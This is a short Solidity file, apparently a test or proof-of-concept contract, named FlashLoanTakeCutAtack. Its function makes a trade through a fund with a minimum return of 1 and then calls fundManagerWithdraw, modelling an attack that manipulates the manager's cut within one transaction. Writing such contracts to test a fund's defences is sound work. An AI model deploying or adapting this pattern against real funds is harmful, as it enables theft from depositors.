pragma solidity ^0.6.12;

interface IFund {
  function trade(
    address _source,
    uint256 _sourceAmount,
    address _destination,
    uint256 _type,
    bytes32[] calldata _proof,
    uint256[] calldata _positions,
    bytes calldata _additionalData,
    uint256 _minReturn
  ) external;

  function fundManagerWithdraw() external;
}

contract FlashLoanTakeCutAtack {
  IFund public fund;

  constructor(address _fund) public {
    fund = IFund(_fund);
  }

  function atack(
    bytes32[] memory proof,
    uint256[] memory positions,
    bytes memory additionalParams,
    address _fromToken,
    address _toToken,
    uint256 _amount
  )
    public
  {
    fund.trade(
      _fromToken,
      _amount,
      _toToken,
      2,
      proof,
      positions,
      additionalParams,
      1
    );

    fund.fundManagerWithdraw();
  }
}
